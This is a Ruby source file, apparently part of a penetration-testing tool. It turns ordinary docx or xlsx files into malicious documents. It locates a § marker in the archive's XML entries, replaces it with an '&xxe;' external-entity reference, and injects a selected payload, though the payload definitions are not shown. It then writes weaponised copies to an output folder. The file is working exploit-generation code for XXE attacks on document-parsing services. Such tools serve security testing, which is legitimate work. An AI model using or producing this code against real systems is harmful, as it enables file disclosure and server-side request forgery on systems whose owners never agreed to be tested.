# encoding: ASCII-8BIT

require 'zipruby'
require 'highline/import'
require 'highline'
require 'fileutils'

# takes in a docx and returns a list of files
def list_files(docx)
	files = []
	Zip::Archive.open(docx, Zip::CREATE) do |zipfile|
		n = zipfile.num_files # gather entries
    
		n.times do |i|
			entry_name = zipfile.get_name(i) # get entry name from archive
			files.push(entry_name)
		end
	end
	return files
end

# The meat of the work:
#	reads in the XML file, inserts XXE and then creates the new OXML
def add_payload(name,payloadx)
	document = ""
	# Read in the XLSX and grab the document.xml
	Zip::Archive.open(@input_file, Zip::CREATE) do |zipfile|
		zipfile.fopen(name) do |f|
			document = f.read # read entry content
		end
	end
	docx_xml = payload(document,payloadx)

	# get file ext
	ext = @input_file.split(".").last
	nname = "output_#{Time.now.to_i}_#{name.gsub(".","_").gsub("/","_")}"
	rand_file = "./output/#{nname}.#{ext}"

	puts "|+| Creating #{rand_file}"
	FileUtils::copy_file(@input_file,rand_file)
	Zip::Archive.open(rand_file, Zip::CREATE) do |zipfile|
		zipfile.add_or_replace_buffer(name,
								  docx_xml)
	end
end

# The string replacement functionality, it's painfully hardcoded right now
def find_string
	if(@input_file.size > 0)
		# TODO check if this exists
		puts "|+| Using #{@input_file}"
	else
		docx = ask("Please Enter Input File (Defaults to samples/sample.docx):")
		if docx.downcase == "Q"
			return
		else
			docx = docx.size == 0 ? "./samples/sample.docx" : docx
			@input_file = docx
			# check if file exists
			if File.file?(docx)		
				puts "|+| #{docx} Loaded"
			else
				puts "|!| #{docx} cannot be found."
				find_string
			end
		end
	end
	
	payloadx = select_payload
	
	puts "|+| Checking for § in #{@input_file}..."

	targets = []
	Zip::Archive.open(@input_file, Zip::CREATE) do |zipfile|
		n = zipfile.num_files # gather entries
    
		n.times do |i|
			nm = zipfile.get_name(i)
			zipfile.fopen(nm) do |f|
				document = f.read # read entry content
				if document =~ /§/
					puts "|+| Found § in #{nm}, replacing with &xxe;"
					targets.push(nm)
				end
			end
		end
	end
	
	if targets.size == 0 
		puts "|-| Could not find § in document, please verify."
		return
	end
	
	targets.each do |target|
		document = ""
		# Read in the XLSX and grab the document.xml
		Zip::Archive.open(@input_file, Zip::CREATE) do |zipfile|
			zipfile.fopen(target) do |f|
				document = f.read # read entry content
			end
		end
		docx_xml = payload(document,payloadx)
		
		# replace string
		docx_xml = docx_xml.gsub("§","&xxe;")

		# get file ext
		ext = @input_file.split(".").last
		nname = "#{Time.now.to_i}_#{target.gsub(".","_").gsub("/","_")}"
		rand_file = "./output/#{nname}.#{ext}"

		puts "|+| Creating #{rand_file}"
		FileUtils::copy_file(@input_file,rand_file)
		Zip::Archive.open(rand_file, Zip::CREATE) do |zipfile|
			zipfile.add_or_replace_buffer(target,
									  docx_xml)
		end
	end
end
